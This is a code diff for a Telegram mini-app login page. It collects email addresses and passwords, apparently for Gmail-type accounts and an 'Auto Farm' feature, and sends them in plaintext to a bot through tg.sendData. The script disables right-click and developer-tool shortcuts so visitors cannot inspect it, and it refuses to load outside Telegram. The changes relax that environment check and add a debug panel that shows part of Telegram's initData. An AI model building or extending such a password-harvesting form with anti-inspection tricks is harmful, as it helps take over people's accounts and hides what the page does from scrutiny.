@@ -30,21 +30,28 @@ input{
   -webkit-user-select:text;user-select:text;
 }
 input:focus{border-color:var(--tg-theme-button-color,#2481cc);}
-.err{min-height:20px;color:#ff6b6b;font-size:13px;margin-bottom:14px;line-height:1.4;}
+.err{min-height:20px;color:#ff6b6b;font-size:13px;margin-bottom:14px;}
 button{
   width:100%;padding:15px;border-radius:12px;border:none;
   background:var(--tg-theme-button-color,#2481cc);
   color:var(--tg-theme-button-text-color,#fff);
   font-size:16px;font-weight:700;cursor:pointer;
-  -webkit-tap-highlight-color:transparent;transition:opacity .15s;
+  -webkit-tap-highlight-color:transparent;
 }
 button:disabled{opacity:.5;cursor:default;}
 button:not(:disabled):active{opacity:.8;}
-#block{text-align:center;padding:50px 20px;display:none;}
-#block .ico{font-size:60px;margin-bottom:18px;}
+#block{text-align:center;padding:40px 20px;display:none;}
+#block .ico{font-size:56px;margin-bottom:14px;}
 #block h2{font-size:20px;margin-bottom:10px;}
 #block p{color:var(--tg-theme-hint-color,#8899a6);line-height:1.6;font-size:14px;}
 #form{display:none;}
+/* debug panel */
+#dbg{
+  margin-top:20px;padding:12px;border-radius:10px;
+  background:rgba(255,255,255,.06);font-size:11px;
+  word-break:break-all;line-height:1.7;display:none;
+  -webkit-user-select:text;user-select:text;
+}
 </style>
 </head>
 <body>
@@ -52,12 +59,12 @@ button:not(:disabled):active{opacity:.8;}
   <div id="block">
     <div class="ico">⛔</div>
     <h2>Доступ запрещён</h2>
-    <p>Это приложение работает<br>только внутри Telegram.<br><br>
-    Открытие в браузере заблокировано.</p>
+    <p>Работает только внутри Telegram<br>через кнопку бота.</p>
+    <div id="dbg"></div>
   </div>
   <div id="form">
     <h1 id="title">🔐 Sign In</h1>
-    <div class="sub">Данные передаются напрямую боту — в чате ничего не появляется</div>
+    <div class="sub">Данные передаются боту напрямую — в чате ничего не появляется</div>
     <div class="field">
       <label>Email</label>
       <input type="email" id="email" placeholder="account@gmail.com"
@@ -75,73 +82,74 @@ button:not(:disabled):active{opacity:.8;}
 
 <script>
 (function(){
-  // Disable right-click and common devtools shortcuts
-  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
-  document.addEventListener('keydown', function(e){
-    if(e.key==='F12' ||
-       (e.ctrlKey && e.shiftKey && ['I','J','C'].indexOf(e.key.toUpperCase())>=0) ||
-       (e.ctrlKey && ['U','S'].indexOf(e.key.toUpperCase())>=0)){
-      e.preventDefault(); return false;
-    }
+  document.addEventListener('contextmenu',function(e){e.preventDefault();});
+  document.addEventListener('keydown',function(e){
+    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].indexOf(e.key.toUpperCase())>=0)||
+       (e.ctrlKey&&['U','S'].indexOf(e.key.toUpperCase())>=0)){e.preventDefault();return false;}
   });
 
-  var tg = window.Telegram && window.Telegram.WebApp;
+  var params  = new URLSearchParams(window.location.search);
+  var debug   = params.get('debug') === '1';
+  var mode    = params.get('mode') || 'login';
 
-  // The only reliable check: initData is a non-empty string injected by the
-  // Telegram client. Empty = opened in a regular browser. Cannot be faked
-  // usefully because sendData() requires Telegram's native bridge to function.
-  var inTelegram = tg && typeof tg.initData === 'string' && tg.initData.length > 0;
+  var tg      = window.Telegram && window.Telegram.WebApp;
+  var hasProxy = typeof window.TelegramWebviewProxy !== 'undefined';
+  var initData = tg ? (tg.initData || '') : '';
+  var platform = tg ? (tg.platform || 'n/a') : 'n/a';
+
+  // Show debug info if ?debug=1 (helps diagnose issues from Telegram)
+  if(debug){
+    var d = document.getElementById('dbg');
+    d.style.display = 'block';
+    d.innerHTML =
+      '<b>tg exists:</b> '     + !!tg           + '<br>' +
+      '<b>WebviewProxy:</b> '  + hasProxy        + '<br>' +
+      '<b>platform:</b> '      + platform        + '<br>' +
+      '<b>initData len:</b> '  + initData.length + '<br>' +
+      '<b>initData[:60]:</b> ' + initData.slice(0,60);
+  }
+
+  // Accept if:
+  //   (a) SDK loaded + initData non-empty, OR
+  //   (b) native bridge exists (SDK may fail to load but Telegram webview is real)
+  var inTelegram = (tg && initData.length > 0) || hasProxy;
 
   if(!inTelegram){
     document.getElementById('block').style.display = 'block';
-    document.title = '403';
     return;
   }
 
-  tg.ready();
-  tg.expand();
-  tg.MainButton.hide();
+  // ── Inside Telegram — show form ───────────────────────────────────────────
+  if(tg){ tg.ready(); tg.expand(); tg.MainButton.hide(); }
 
-  var params = new URLSearchParams(window.location.search);
-  var mode = params.get('mode') || 'login';
-
-  if(mode === 'af'){
+  if(mode==='af'){
     document.getElementById('title').textContent = '🤖 Auto Farm';
     document.querySelector('.sub').textContent = 'Добавить аккаунт в авто-фарм';
     document.getElementById('btn').textContent = 'Добавить';
   }
-
   document.getElementById('form').style.display = 'block';
 
   document.getElementById('btn').addEventListener('click', submit);
-  document.addEventListener('keydown', function(e){
-    if(e.key==='Enter') submit();
-  });
+  document.addEventListener('keydown',function(e){ if(e.key==='Enter') submit(); });
 
   function submit(){
     var email = document.getElementById('email').value.trim().toLowerCase();
     var pw    = document.getElementById('password').value;
     var errEl = document.getElementById('err');
     var btn   = document.getElementById('btn');
-
     errEl.textContent = '';
 
-    if(!email || email.indexOf('@') < 1 || email.length < 5){
-      errEl.textContent = '❌ Введите корректный email';
-      document.getElementById('email').focus();
-      return;
+    if(!email || email.indexOf('@')<1 || email.length<5){
+      errEl.textContent='❌ Введите корректный email';
+      document.getElementById('email').focus(); return;
     }
-    if(!pw || pw.length < 4){
-      errEl.textContent = '❌ Введите пароль';
-      document.getElementById('password').focus();
-      return;
+    if(!pw || pw.length<4){
+      errEl.textContent='❌ Введите пароль';
+      document.getElementById('password').focus(); return;
     }
 
-    btn.disabled = true;
-    btn.textContent = '⏳ Отправка…';
-
-    // Sends directly to the bot via Telegram's bridge — never stored in chat.
-    tg.sendData(JSON.stringify({mode:mode, email:email, password:pw}));
+    btn.disabled=true; btn.textContent='⏳ Отправка…';
+    tg.sendData(JSON.stringify({mode:mode,email:email,password:pw}));
   }
 }());
 </script>
